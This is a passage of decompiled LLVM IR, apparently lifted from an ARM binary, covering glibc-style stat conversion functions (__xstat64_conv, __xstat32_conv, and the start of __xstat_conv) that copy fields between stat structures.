  uselistorder i32 %v0_1adec, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1ae1c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1ae2c = load i32, i32* @r4, align 4
  store i32 %v3_1ae2c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_1ae44 = inttoptr i32 %arg2 to i8*
  %v3_1ae44 = call i32 @__GI_memset(i8* %v2_1ae44, i32 0)
  %v2_1ae48 = load i32, i32* %arg1, align 4
  store i32 %v2_1ae48, i32* %r3.global-to-local, align 4
  %v3_1ae48 = add i32 %tmp, 4
  %v4_1ae48 = inttoptr i32 %v3_1ae48 to i32*
  %v5_1ae48 = load i32, i32* %v4_1ae48, align 4
  store i32 %v5_1ae48, i32* %r4.global-to-local, align 4
  %v0_1ae4c = load i32, i32* %r5.global-to-local, align 4
  %v1_1ae4c = inttoptr i32 %v0_1ae4c to i32*
  store i32 %v2_1ae48, i32* %v1_1ae4c, align 4
  %v3_1ae4c = add i32 %v0_1ae4c, 4
  %v4_1ae4c = inttoptr i32 %v3_1ae4c to i32*
  %v5_1ae4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1ae4c, i32* %v4_1ae4c, align 4
  %v0_1ae50 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae50 = add i32 %v0_1ae50, 12
  %v2_1ae50 = inttoptr i32 %v1_1ae50 to i32*
  %v3_1ae50 = load i32, i32* %v2_1ae50, align 4
  %v1_1ae54 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae54 = add i32 %v1_1ae54, 12
  %v3_1ae54 = inttoptr i32 %v2_1ae54 to i32*
  store i32 %v3_1ae50, i32* %v3_1ae54, align 4
  %v0_1ae58 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae58 = add i32 %v0_1ae58, 96
  store i32 %v1_1ae58, i32* %r3.global-to-local, align 4
  %v1_1ae5c = inttoptr i32 %v1_1ae58 to i32*
  %v2_1ae5c = load i32, i32* %v1_1ae5c, align 4
  store i32 %v2_1ae5c, i32* %r3.global-to-local, align 4
  %v3_1ae5c = add i32 %v0_1ae58, 100
  %v4_1ae5c = inttoptr i32 %v3_1ae5c to i32*
  %v5_1ae5c = load i32, i32* %v4_1ae5c, align 4
  store i32 %v5_1ae5c, i32* %r4.global-to-local, align 4
  %v1_1ae60 = add i32 %v0_1ae58, 56
  %v2_1ae60 = inttoptr i32 %v1_1ae60 to i32*
  %v3_1ae60 = load i32, i32* %v2_1ae60, align 4
  store i32 %v3_1ae60, i32* %r2.global-to-local, align 4
  %v1_1ae64 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae64 = add i32 %v1_1ae64, 96
  %v3_1ae64 = inttoptr i32 %v2_1ae64 to i32*
  store i32 %v2_1ae5c, i32* %v3_1ae64, align 4
  %v0_1ae68 = load i32, i32* %r4.global-to-local, align 4
  %v1_1ae68 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae68 = add i32 %v1_1ae68, 100
  %v3_1ae68 = inttoptr i32 %v2_1ae68 to i32*
  store i32 %v0_1ae68, i32* %v3_1ae68, align 4
  %v0_1ae6c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae6c = add i32 %v0_1ae6c, 24
  store i32 %v1_1ae6c, i32* %ip.global-to-local, align 4
  %v1_1ae70 = inttoptr i32 %v1_1ae6c to i32*
  %v2_1ae70 = load i32, i32* %v1_1ae70, align 4
  store i32 %v2_1ae70, i32* %ip.global-to-local, align 4
  %v3_1ae70 = add i32 %v0_1ae6c, 28
  %v4_1ae70 = inttoptr i32 %v3_1ae70 to i32*
  %v5_1ae70 = load i32, i32* %v4_1ae70, align 4
  store i32 %v5_1ae70, i32* %lr.global-to-local, align 4
  %v0_1ae74 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ae74 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae74 = add i32 %v1_1ae74, 56
  %v3_1ae74 = inttoptr i32 %v2_1ae74 to i32*
  store i32 %v0_1ae74, i32* %v3_1ae74, align 4
  %v0_1ae78 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae78 = add i32 %v0_1ae78, 72
  store i32 %v1_1ae78, i32* %r3.global-to-local, align 4
  %v1_1ae7c = add i32 %v0_1ae78, 32
  store i32 %v1_1ae7c, i32* %r7.global-to-local, align 4
  %v1_1ae80 = inttoptr i32 %v1_1ae7c to i32*
  %v2_1ae80 = load i32, i32* %v1_1ae80, align 4
  store i32 %v2_1ae80, i32* %r7.global-to-local, align 4
  %v3_1ae80 = add i32 %v0_1ae78, 36
  %v4_1ae80 = inttoptr i32 %v3_1ae80 to i32*
  %v5_1ae80 = load i32, i32* %v4_1ae80, align 4
  store i32 %v5_1ae80, i32* %r8.global-to-local, align 4
  %v1_1ae84 = inttoptr i32 %v1_1ae78 to i32*
  %v2_1ae84 = load i32, i32* %v1_1ae84, align 4
  %v3_1ae84 = add i32 %v0_1ae78, 76
  %v4_1ae84 = inttoptr i32 %v3_1ae84 to i32*
  %v5_1ae84 = load i32, i32* %v4_1ae84, align 4
  store i32 %v5_1ae84, i32* %r1.global-to-local, align 4
  %v0_1ae88 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ae88 = add i32 %v0_1ae88, 72
  %v1_1ae8c = inttoptr i32 %v1_1ae88 to i32*
  store i32 %v2_1ae84, i32* %v1_1ae8c, align 4
  %v3_1ae8c = add i32 %v0_1ae88, 76
  %v4_1ae8c = inttoptr i32 %v3_1ae8c to i32*
  %v5_1ae8c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1ae8c, i32* %v4_1ae8c, align 4
  %v0_1ae90 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ae90 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae90 = add i32 %v1_1ae90, 32
  %v3_1ae90 = inttoptr i32 %v2_1ae90 to i32*
  store i32 %v0_1ae90, i32* %v3_1ae90, align 4
  %v0_1ae94 = load i32, i32* %r8.global-to-local, align 4
  %v1_1ae94 = load i32, i32* %r5.global-to-local, align 4
  %v2_1ae94 = add i32 %v1_1ae94, 36
  %v3_1ae94 = inttoptr i32 %v2_1ae94 to i32*
  store i32 %v0_1ae94, i32* %v3_1ae94, align 4
  %v0_1ae98 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae98 = add i32 %v0_1ae98, 80
  store i32 %v1_1ae98, i32* %r3.global-to-local, align 4
  %v1_1ae9c = add i32 %v0_1ae98, 48
  store i32 %v1_1ae9c, i32* %r7.global-to-local, align 4
  %v1_1aea0 = inttoptr i32 %v1_1ae9c to i32*
  %v2_1aea0 = load i32, i32* %v1_1aea0, align 4
  store i32 %v2_1aea0, i32* %r7.global-to-local, align 4
  %v3_1aea0 = add i32 %v0_1ae98, 52
  %v4_1aea0 = inttoptr i32 %v3_1aea0 to i32*
  %v5_1aea0 = load i32, i32* %v4_1aea0, align 4
  store i32 %v5_1aea0, i32* %r8.global-to-local, align 4
  %v1_1aea4 = inttoptr i32 %v1_1ae98 to i32*
  %v2_1aea4 = load i32, i32* %v1_1aea4, align 4
  %v3_1aea4 = add i32 %v0_1ae98, 84
  %v4_1aea4 = inttoptr i32 %v3_1aea4 to i32*
  %v5_1aea4 = load i32, i32* %v4_1aea4, align 4
  store i32 %v5_1aea4, i32* %r1.global-to-local, align 4
  %v1_1aea8 = add i32 %v0_1ae98, 16
  %v2_1aea8 = inttoptr i32 %v1_1aea8 to i32*
  %v3_1aea8 = load i32, i32* %v2_1aea8, align 4
  store i32 %v3_1aea8, i32* %r2.global-to-local, align 4
  %v0_1aeac = load i32, i32* %r5.global-to-local, align 4
  %v1_1aeac = add i32 %v0_1aeac, 80
  %v1_1aeb0 = inttoptr i32 %v1_1aeac to i32*
  store i32 %v2_1aea4, i32* %v1_1aeb0, align 4
  %v3_1aeb0 = add i32 %v0_1aeac, 84
  %v4_1aeb0 = inttoptr i32 %v3_1aeb0 to i32*
  %v5_1aeb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aeb0, i32* %v4_1aeb0, align 4
  %v0_1aeb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1aeb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1aeb4 = add i32 %v1_1aeb4, 48
  %v3_1aeb4 = inttoptr i32 %v2_1aeb4 to i32*
  store i32 %v0_1aeb4, i32* %v3_1aeb4, align 4
  %v0_1aeb8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1aeb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1aeb8 = add i32 %v1_1aeb8, 52
  %v3_1aeb8 = inttoptr i32 %v2_1aeb8 to i32*
  store i32 %v0_1aeb8, i32* %v3_1aeb8, align 4
  %v0_1aebc = load i32, i32* %r2.global-to-local, align 4
  %v1_1aebc = load i32, i32* %r5.global-to-local, align 4
  %v2_1aebc = add i32 %v1_1aebc, 16
  %v3_1aebc = inttoptr i32 %v2_1aebc to i32*
  store i32 %v0_1aebc, i32* %v3_1aebc, align 4
  %v0_1aec0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1aec0 = add i32 %v0_1aec0, 88
  store i32 %v1_1aec0, i32* %r3.global-to-local, align 4
  %v1_1aec4 = add i32 %v0_1aec0, 20
  %v2_1aec4 = inttoptr i32 %v1_1aec4 to i32*
  %v3_1aec4 = load i32, i32* %v2_1aec4, align 4
  store i32 %v3_1aec4, i32* %r2.global-to-local, align 4
  %v1_1aec8 = inttoptr i32 %v1_1aec0 to i32*
  %v2_1aec8 = load i32, i32* %v1_1aec8, align 4
  %v3_1aec8 = add i32 %v0_1aec0, 92
  %v4_1aec8 = inttoptr i32 %v3_1aec8 to i32*
  %v5_1aec8 = load i32, i32* %v4_1aec8, align 4
  store i32 %v5_1aec8, i32* %r1.global-to-local, align 4
  %v1_1aecc = add i32 %v0_1aec0, 64
  store i32 %v1_1aecc, i32* %r6.global-to-local, align 4
  %v1_1aed0 = inttoptr i32 %v1_1aecc to i32*
  %v2_1aed0 = load i32, i32* %v1_1aed0, align 4
  store i32 %v2_1aed0, i32* %r6.global-to-local, align 4
  %v3_1aed0 = add i32 %v0_1aec0, 68
  %v4_1aed0 = inttoptr i32 %v3_1aed0 to i32*
  %v5_1aed0 = load i32, i32* %v4_1aed0, align 4
  store i32 %v5_1aed0, i32* %r7.global-to-local, align 4
  %v0_1aed4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1aed4 = add i32 %v0_1aed4, 88
  store i32 %v1_1aed4, i32* %r3.global-to-local, align 4
  %v2_1aed8 = add i32 %v0_1aed4, 20
  %v3_1aed8 = inttoptr i32 %v2_1aed8 to i32*
  store i32 %v3_1aec4, i32* %v3_1aed8, align 4
  %v0_1aedc = load i32, i32* %ip.global-to-local, align 4
  %v1_1aedc = load i32, i32* %r5.global-to-local, align 4
  %v2_1aedc = add i32 %v1_1aedc, 24
  %v3_1aedc = inttoptr i32 %v2_1aedc to i32*
  store i32 %v0_1aedc, i32* %v3_1aedc, align 4
  %v0_1aee0 = load i32, i32* %lr.global-to-local, align 4
  %v1_1aee0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1aee0 = add i32 %v1_1aee0, 28
  %v3_1aee0 = inttoptr i32 %v2_1aee0 to i32*
  store i32 %v0_1aee0, i32* %v3_1aee0, align 4
  %v0_1aee4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1aee4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1aee4 = add i32 %v1_1aee4, 64
  %v3_1aee4 = inttoptr i32 %v2_1aee4 to i32*
  store i32 %v0_1aee4, i32* %v3_1aee4, align 4
  %v0_1aee8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1aee8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1aee8 = add i32 %v1_1aee8, 68
  %v3_1aee8 = inttoptr i32 %v2_1aee8 to i32*
  store i32 %v0_1aee8, i32* %v3_1aee8, align 4
  %v0_1aeec = load i32, i32* %r3.global-to-local, align 4
  %v1_1aeec = inttoptr i32 %v0_1aeec to i32*
  store i32 %v2_1aec8, i32* %v1_1aeec, align 4
  %v3_1aeec = add i32 %v0_1aeec, 4
  %v4_1aeec = inttoptr i32 %v3_1aeec to i32*
  %v5_1aeec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aeec, i32* %v4_1aeec, align 4
  %v2_1aef0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1aef0, i32* %r4.global-to-local, align 4
  ret i32 %v2_1aec8

; uselistorder directives
  uselistorder i32 %v0_1aec0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1ae98, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 104, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1aef8 = load i32, i32* @r4, align 4
  store i32 %v3_1aef8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1af10 = inttoptr i32 %arg2 to i8*
  %v3_1af10 = call i32 @__GI_memset(i8* %v2_1af10, i32 0)
  %v2_1af14 = load i32, i32* %arg1, align 4
  %v3_1af14 = add i32 %tmp, 4
  %v4_1af14 = inttoptr i32 %v3_1af14 to i32*
  %v5_1af14 = load i32, i32* %v4_1af14, align 4
  store i32 %v5_1af14, i32* %r4.global-to-local, align 4
  %v0_1af18 = load i32, i32* %r6.global-to-local, align 4
  %v1_1af18 = inttoptr i32 %v0_1af18 to i32*
  store i32 %v2_1af14, i32* %v1_1af18, align 4
  %v3_1af18 = add i32 %v0_1af18, 4
  %v4_1af18 = inttoptr i32 %v3_1af18 to i32*
  %v5_1af18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1af18, i32* %v4_1af18, align 4
  %v0_1af1c = load i32, i32* %r5.global-to-local, align 4
  %v1_1af1c = add i32 %v0_1af1c, 32
  %v1_1af20 = inttoptr i32 %v1_1af1c to i32*
  %v2_1af20 = load i32, i32* %v1_1af20, align 4
  %v3_1af20 = add i32 %v0_1af1c, 36
  %v4_1af20 = inttoptr i32 %v3_1af20 to i32*
  %v5_1af20 = load i32, i32* %v4_1af20, align 4
  store i32 %v5_1af20, i32* %r4.global-to-local, align 4
  %v1_1af24 = add i32 %v0_1af1c, 96
  %v2_1af24 = inttoptr i32 %v1_1af24 to i32*
  %v3_1af24 = load i32, i32* %v2_1af24, align 4
  store i32 %v3_1af24, i32* %r2.global-to-local, align 4
  %v1_1af28 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af28 = add i32 %v1_1af28, 32
  %v3_1af28 = inttoptr i32 %v2_1af28 to i32*
  store i32 %v2_1af20, i32* %v3_1af28, align 4
  %v0_1af2c = load i32, i32* %r4.global-to-local, align 4
  %v1_1af2c = load i32, i32* %r6.global-to-local, align 4
  %v2_1af2c = add i32 %v1_1af2c, 36
  %v3_1af2c = inttoptr i32 %v2_1af2c to i32*
  store i32 %v0_1af2c, i32* %v3_1af2c, align 4
  %v0_1af30 = load i32, i32* %r2.global-to-local, align 4
  %v1_1af30 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af30 = add i32 %v1_1af30, 12
  %v3_1af30 = inttoptr i32 %v2_1af30 to i32*
  store i32 %v0_1af30, i32* %v3_1af30, align 4
  %v0_1af34 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af34 = add i32 %v0_1af34, 48
  %v2_1af34 = inttoptr i32 %v1_1af34 to i32*
  %v3_1af34 = load i32, i32* %v2_1af34, align 4
  %v1_1af38 = add i32 %v0_1af34, 24
  store i32 %v1_1af38, i32* %ip.global-to-local, align 4
  %v1_1af3c = inttoptr i32 %v1_1af38 to i32*
  %v2_1af3c = load i32, i32* %v1_1af3c, align 4
  store i32 %v2_1af3c, i32* %ip.global-to-local, align 4
  %v3_1af3c = add i32 %v0_1af34, 28
  %v4_1af3c = inttoptr i32 %v3_1af3c to i32*
  %v5_1af3c = load i32, i32* %v4_1af3c, align 4
  store i32 %v5_1af3c, i32* %lr.global-to-local, align 4
  %v1_1af40 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af40 = add i32 %v1_1af40, 44
  %v3_1af40 = inttoptr i32 %v2_1af40 to i32*
  store i32 %v3_1af34, i32* %v3_1af40, align 4
  %v0_1af44 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af44 = add i32 %v0_1af44, 64
  %v2_1af44 = inttoptr i32 %v1_1af44 to i32*
  %v3_1af44 = load i32, i32* %v2_1af44, align 4
  %v1_1af48 = add i32 %v0_1af44, 56
  %v2_1af48 = inttoptr i32 %v1_1af48 to i32*
  %v3_1af48 = load i32, i32* %v2_1af48, align 4
  store i32 %v3_1af48, i32* %r2.global-to-local, align 4
  %v1_1af4c = load i32, i32* %r6.global-to-local, align 4
  %v2_1af4c = add i32 %v1_1af4c, 52
  %v3_1af4c = inttoptr i32 %v2_1af4c to i32*
  store i32 %v3_1af44, i32* %v3_1af4c, align 4
  %v0_1af50 = load i32, i32* %r2.global-to-local, align 4
  %v1_1af50 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af50 = add i32 %v1_1af50, 48
  %v3_1af50 = inttoptr i32 %v2_1af50 to i32*
  store i32 %v0_1af50, i32* %v3_1af50, align 4
  %v0_1af54 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af54 = add i32 %v0_1af54, 72
  %v1_1af58 = inttoptr i32 %v1_1af54 to i32*
  %v2_1af58 = load i32, i32* %v1_1af58, align 4
  %v3_1af58 = add i32 %v0_1af54, 76
  %v4_1af58 = inttoptr i32 %v3_1af58 to i32*
  %v5_1af58 = load i32, i32* %v4_1af58, align 4
  store i32 %v5_1af58, i32* %r1.global-to-local, align 4
  %v0_1af5c = load i32, i32* %r6.global-to-local, align 4
  %v1_1af5c = add i32 %v0_1af5c, 56
  %v1_1af60 = inttoptr i32 %v1_1af5c to i32*
  store i32 %v2_1af58, i32* %v1_1af60, align 4
  %v3_1af60 = add i32 %v0_1af5c, 60
  %v4_1af60 = inttoptr i32 %v3_1af60 to i32*
  %v5_1af60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1af60, i32* %v4_1af60, align 4
  %v0_1af64 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af64 = add i32 %v0_1af64, 80
  %v1_1af68 = inttoptr i32 %v1_1af64 to i32*
  %v2_1af68 = load i32, i32* %v1_1af68, align 4
  %v3_1af68 = add i32 %v0_1af64, 84
  %v4_1af68 = inttoptr i32 %v3_1af68 to i32*
  %v5_1af68 = load i32, i32* %v4_1af68, align 4
  store i32 %v5_1af68, i32* %r1.global-to-local, align 4
  %v0_1af6c = load i32, i32* %r6.global-to-local, align 4
  %v1_1af6c = add i32 %v0_1af6c, 64
  %v1_1af70 = inttoptr i32 %v1_1af6c to i32*
  store i32 %v2_1af68, i32* %v1_1af70, align 4
  %v3_1af70 = add i32 %v0_1af6c, 68
  %v4_1af70 = inttoptr i32 %v3_1af70 to i32*
  %v5_1af70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1af70, i32* %v4_1af70, align 4
  %v0_1af74 = load i32, i32* %r5.global-to-local, align 4
  %v1_1af74 = add i32 %v0_1af74, 16
  %v2_1af74 = inttoptr i32 %v1_1af74 to i32*
  %v3_1af74 = load i32, i32* %v2_1af74, align 4
  %v1_1af78 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af78 = add i32 %v1_1af78, 16
  %v3_1af78 = inttoptr i32 %v2_1af78 to i32*
  store i32 %v3_1af74, i32* %v3_1af78, align 4
  %v0_1af7c = load i32, i32* %r5.global-to-local, align 4
  %v1_1af7c = add i32 %v0_1af7c, 88
  %v1_1af80 = add i32 %v0_1af7c, 20
  %v2_1af80 = inttoptr i32 %v1_1af80 to i32*
  %v3_1af80 = load i32, i32* %v2_1af80, align 4
  store i32 %v3_1af80, i32* %r2.global-to-local, align 4
  %v1_1af84 = inttoptr i32 %v1_1af7c to i32*
  %v2_1af84 = load i32, i32* %v1_1af84, align 4
  %v3_1af84 = add i32 %v0_1af7c, 92
  %v4_1af84 = inttoptr i32 %v3_1af84 to i32*
  %v5_1af84 = load i32, i32* %v4_1af84, align 4
  store i32 %v5_1af84, i32* %r1.global-to-local, align 4
  %v0_1af88 = load i32, i32* %r6.global-to-local, align 4
  %v1_1af88 = add i32 %v0_1af88, 72
  %v1_1af8c = inttoptr i32 %v1_1af88 to i32*
  store i32 %v2_1af84, i32* %v1_1af8c, align 4
  %v3_1af8c = add i32 %v0_1af88, 76
  %v4_1af8c = inttoptr i32 %v3_1af8c to i32*
  %v5_1af8c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1af8c, i32* %v4_1af8c, align 4
  %v0_1af90 = load i32, i32* %r2.global-to-local, align 4
  %v1_1af90 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af90 = add i32 %v1_1af90, 20
  %v3_1af90 = inttoptr i32 %v2_1af90 to i32*
  store i32 %v0_1af90, i32* %v3_1af90, align 4
  %v0_1af94 = load i32, i32* %ip.global-to-local, align 4
  %v1_1af94 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af94 = add i32 %v1_1af94, 24
  %v3_1af94 = inttoptr i32 %v2_1af94 to i32*
  store i32 %v0_1af94, i32* %v3_1af94, align 4
  %v0_1af98 = load i32, i32* %lr.global-to-local, align 4
  %v1_1af98 = load i32, i32* %r6.global-to-local, align 4
  %v2_1af98 = add i32 %v1_1af98, 28
  %v3_1af98 = inttoptr i32 %v2_1af98 to i32*
  store i32 %v0_1af98, i32* %v3_1af98, align 4
  %v2_1af9c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1af9c, i32* %r4.global-to-local, align 4
  ret i32 %v2_1af84

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2, 4 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 0, 7, 8 }
  uselistorder i32 96, { 4, 5, 6, 7, 8, 1, 2, 0, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1afc0 = inttoptr i32 %arg2 to i8*
  %v3_1afc0 = call i32 @__GI_memset(i8* %v2_1afc0, i32 0)
  %v1_1afc4 = add i32 %tmp, 4
  %v2_1afc4 = inttoptr i32 %v1_1afc4 to i32*
  %v3_1afc4 = load i32, i32* %v2_1afc4, align 4
  %v2_1afc8 = load i32, i32* %arg1, align 4
  store i32 %v2_1afc8, i32* %r8.global-to-local, align 4
  %v1_1afcc = load i32, i32* %r5.global-to-local, align 4
  %v2_1afcc = add i32 %v1_1afcc, 12
  %v3_1afcc = inttoptr i32 %v2_1afcc to i32*
  store i32 %v3_1afc4, i32* %v3_1afcc, align 4
  %v0_1afd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1afd0 = add i32 %v0_1afd0, 20
  %v2_1afd0 = inttoptr i32 %v1_1afd0 to i32*
  %v3_1afd0 = load i32, i32* %v2_1afd0, align 4
  %v1_1afd4 = add i32 %v0_1afd0, 16
  %v2_1afd4 = inttoptr i32 %v1_1afd4 to i32*
  %v3_1afd4 = load i32, i32* %v2_1afd4, align 4
  store i32 %v3_1afd4, i32* %r6.global-to-local, align 4
  %v1_1afd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1afd8 = add i32 %v1_1afd8, 44
  %v3_1afd8 = inttoptr i32 %v2_1afd8 to i32*
  store i32 %v3_1afd0, i32* %v3_1afd8, align 4
  %v0_1afdc = load i32, i32* %r4.global-to-local, align 4
  %v1_1afdc = add i32 %v0_1afdc, 24
  %v2_1afdc = inttoptr i32 %v1_1afdc to i32*
  %v3_1afdc = load i32, i32* %v2_1afdc, align 4
  %v1_1afe0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1afe0 = add i32 %v1_1afe0, 48
  %v3_1afe0 = inttoptr i32 %v2_1afe0 to i32*
  store i32 %v3_1afdc, i32* %v3_1afe0, align 4
  %v0_1afe4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1afe4 = add i32 %v0_1afe4, 28
  %v2_1afe4 = inttoptr i32 %v1_1afe4 to i32*
  %v3_1afe4 = load i32, i32* %v2_1afe4, align 4
  %v1_1afe8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1afe8 = add i32 %v1_1afe8, 52
  %v3_1afe8 = inttoptr i32 %v2_1afe8 to i32*
  store i32 %v3_1afe4, i32* %v3_1afe8, align 4
  %v0_1afec = load i32, i32* %r4.global-to-local, align 4
  %v1_1afec = add i32 %v0_1afec, 32
  %v1_1aff0 = inttoptr i32 %v1_1afec to i32*
  %v2_1aff0 = load i32, i32* %v1_1aff0, align 4
  %v3_1aff0 = add i32 %v0_1afec, 36
  %v4_1aff0 = inttoptr i32 %v3_1aff0 to i32*
  %v5_1aff0 = load i32, i32* %v4_1aff0, align 4
  store i32 %v5_1aff0, i32* %r1.global-to-local, align 4
  %v0_1aff4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1aff4 = add i32 %v0_1aff4, 56
  %v1_1aff8 = inttoptr i32 %v1_1aff4 to i32*
  store i32 %v2_1aff0, i32* %v1_1aff8, align 4
  %v3_1aff8 = add i32 %v0_1aff4, 60
  %v4_1aff8 = inttoptr i32 %v3_1aff8 to i32*
  %v5_1aff8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1aff8, i32* %v4_1aff8, align 4
  %v0_1affc = load i32, i32* %r4.global-to-local, align 4
  %v1_1affc = add i32 %v0_1affc, 40
  %v1_1b000 = inttoptr i32 %v1_1affc to i32*
  %v2_1b000 = load i32, i32* %v1_1b000, align 4
  %v3_1b000 = add i32 %v0_1affc, 44
  %v4_1b000 = inttoptr i32 %v3_1b000 to i32*
  %v5_1b000 = load i32, i32* %v4_1b000, align 4
  store i32 %v5_1b000, i32* %r1.global-to-local, align 4
  %v0_1b004 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b004 = add i32 %v0_1b004, 64
  %v1_1b008 = inttoptr i32 %v1_1b004 to i32*
  store i32 %v2_1b000, i32* %v1_1b008, align 4
  %v3_1b008 = add i32 %v0_1b004, 68
  %v4_1b008 = inttoptr i32 %v3_1b008 to i32*
  %v5_1b008 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b008, i32* %v4_1b008, align 4
  %v0_1b00c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b00c = add i32 %v0_1b00c, 48
  %v1_1b010 = inttoptr i32 %v1_1b00c to i32*
  %v2_1b010 = load i32, i32* %v1_1b010, align 4
  %v3_1b010 = add i32 %v0_1b00c, 52
  %v4_1b010 = inttoptr i32 %v3_1b010 to i32*
  %v5_1b010 = load i32, i32* %v4_1b010, align 4
  store i32 %v5_1b010, i32* %r1.global-to-local, align 4
  %v1_1b014 = add i32 %v0_1b00c, 8
  %v2_1b014 = inttoptr i32 %v1_1b014 to i16*
  %v3_1b014 = load i16, i16* %v2_1b014, align 2
